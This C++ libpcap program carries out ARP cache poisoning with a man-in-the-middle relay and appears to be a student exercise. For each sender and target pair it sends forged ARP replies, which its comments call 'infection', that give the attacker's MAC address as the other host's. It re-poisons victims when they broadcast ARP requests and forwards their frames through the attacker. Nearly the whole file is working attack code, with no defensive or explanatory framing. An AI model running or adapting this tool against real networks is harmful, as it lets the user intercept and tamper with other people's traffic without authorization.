#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "myInfo.h"
#include <vector>
#include <map>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender2 ip> <target2 ip> ... ]\n");
    printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n");
}

// pcap_sendpacket or pcap_next_ex
EthArpPacket make_packet(Mac ethDMAC, Mac ethSMAC, Mac arpSMAC, Mac arpTMAC, Ip arpSIP, Ip arpTIP, uint16_t op){

    EthArpPacket packet;

    packet.eth_.dmac_ = ethDMAC;
    packet.eth_.smac_ = ethSMAC;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    // request = op 1 , reply = op 2
    if(op == ArpHdr::Request)
        packet.arp_.op_ = htons(ArpHdr::Request);
    if(op == ArpHdr::Reply)
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = arpSMAC;
    packet.arp_.sip_ = htonl(arpSIP);
    packet.arp_.tmac_ = arpTMAC;
    packet.arp_.tip_ = htonl(arpTIP);

    return packet;
}

void err_check(int res, char c, pcap_t* handle)
{
    // c = 's' : pcap_sendpacket, 'n' : pcap_next_ex
    if(c == 's'){
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
    else if(c == 'n'){
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
}

Mac Get_Macs_and_Infection(Ip sender_Ip, Ip target_Ip, Mac myMac, Ip myIp, pcap_t* handle)
{
    EthArpPacket packet;
    int res;
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    EthHdr* eth_hdr;
    ArpHdr* arp_hdr;
    Mac sender_mac;

    // request to sender
    packet = make_packet(Mac::broadcastMac(), myMac, myMac, Mac::nullMac(), myIp, sender_Ip, ArpHdr::Request);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    err_check(res, 's', handle);

    int try_count = 0;
    while(try_count < 10){

        // reply packet recieve
        res = pcap_next_ex(handle, &header, &reply_packet);
        if(res == 0){
           try_count++;
           continue;
        }
        err_check(res, 'n', handle);

        eth_hdr = (EthHdr*)reply_packet;
        arp_hdr = (ArpHdr*)(reply_packet + sizeof(EthHdr));

        // infection fail
        if(eth_hdr->type() != EthHdr::Arp){
            try_count++;
            continue;
        }
        if(eth_hdr->type() != EthHdr::Arp){
            try_count++;
            continue;
        }
        if(arp_hdr->hrd() != ArpHdr::ETHER || arp_hdr->pro() != EthHdr::Ip4 || arp_hdr->pln() != Ip::SIZE || arp_hdr->op() != ArpHdr::Reply){
            try_count++;
            continue;
        }
        if((arp_hdr->tmac() != myMac) || (arp_hdr->tip() != myIp) || (arp_hdr->sip() != sender_Ip)){
            try_count++;
            continue;
        }

        // infection success
        sender_mac = eth_hdr->smac();
        packet = make_packet(sender_mac, myMac, myMac, sender_mac, target_Ip, sender_Ip, ArpHdr::Reply);
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        err_check(res, 's', handle);

        printf("Infection Success to sender ip : %s\n", std::string(sender_Ip).c_str());
        printf("Infected sender mac : %s\n", std::string(sender_mac).c_str());
        break;
    }

    return sender_mac;
}

void Relay(Mac myMac, Mac targetMac, Ip targetIp, pcap_t *handle, const u_char* packet)
{
    int res;

    EthArpPacket relay_packet;
    EthHdr* eth = (EthHdr*)(packet);
    ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

    eth->smac_ = myMac;
    eth->dmac_ = targetMac;
    arp->smac_ = myMac;
    arp->tmac_ = targetMac;
    arp->tip_ = targetIp;

    relay_packet = {*eth, *arp};

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relay_packet), sizeof(EthArpPacket));
    err_check(res, 's', handle);

    printf("Relay to %s from %s (%d)\n", std::string(arp->tip()).c_str(), std::string(arp->sip()).c_str(), arp->op());
    printf("Target Mac : %s, Sender Mac : %s\n", std::string(arp->tmac()).c_str(), std::string(arp->smac()).c_str());
}

int main(int argc, char* argv[]) {

    // many input case
    if (argc < 4 || (argc & 1) == 1) {
        usage();
        return -1;
    }

	char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    Mac myMac = GetmyMac(); // attacker
    Ip myIp = GetMyIpAddr(argv[1]); // attacker
    std::map<Ip, Ip> ip_map_sender_target; // key : Ip of sender, value : Ip of target
    std::map<Ip, Ip> ip_map_target_sender; // key : Ip of target, value : Ip if sender
    std::map<Ip, Mac> ip_and_mac_sender; // key : Ip of sender, value : Mac of sender
    std::map<Ip, Mac> ip_and_mac_target; // key : Ip of target, value : Mac of target

    for(int i = 2; i < argc; i += 2){
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);

        Mac sender_mac = Get_Macs_and_Infection(sender_ip, target_ip, myMac, myIp, handle);
        ip_and_mac_sender[sender_ip] = sender_mac;
        ip_map_sender_target[sender_ip] = target_ip;

        Mac target_mac = Get_Macs_and_Infection(target_ip, sender_ip, myMac, myIp, handle);
        ip_and_mac_target[target_ip] = target_mac;
        ip_map_target_sender[target_ip] = sender_ip;
    }

    EthHdr* eth_hdr;
    ArpHdr* arp_hdr;

    while(true){

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res;

        // recieve packet
        res = pcap_next_ex(handle, &header, &packet);
        if(res == 0)
            continue;
        err_check(res, 'n', handle);

        eth_hdr = (EthHdr*)packet;
        arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));

        // ethernet, arp, ipv4 check
        if(eth_hdr->type() != EthHdr::Arp)
            continue;

        // relay or re-infection

        // re-infection
        Ip sender_ip = arp_hdr->sip();
        Ip target_ip;
        if(eth_hdr->dmac() == Mac::broadcastMac()){
            // sender is sender
            if(ip_map_sender_target[sender_ip]){
                target_ip = ip_map_sender_target[sender_ip];
                Get_Macs_and_Infection(sender_ip, target_ip, myMac, myIp, handle);
                printf("re-infection to %s\n", std::string(sender_ip).c_str());
            }
            // sender is target
            else if(ip_map_target_sender[sender_ip]){
                target_ip = ip_map_target_sender[sender_ip];
                Get_Macs_and_Infection(sender_ip, target_ip, myMac, myIp, handle);
                printf("re-infection to %s\n", std::string(sender_ip).c_str());
            }
        }

        if(arp_hdr->hrd() != ArpHdr::ETHER || arp_hdr->pro() != EthHdr::Ip4 || arp_hdr->pln() != Ip::SIZE)
            continue;

        // relay (sender -> request/reply -> target)
        Mac target_mac;

        // sender is sender
        if(ip_map_sender_target[sender_ip]){
            target_ip = ip_map_sender_target[sender_ip];
            target_mac = ip_and_mac_target[target_ip];
            Relay(myMac, target_mac, target_ip, handle, packet);
        }
        // sender is target
        if(ip_map_target_sender[sender_ip]){
            target_ip = ip_map_target_sender[sender_ip];
            target_mac = ip_and_mac_sender[target_ip];
            Relay(myMac, target_mac, target_ip, handle, packet);
        }
    }

    pcap_close(handle);

    return 0;
}
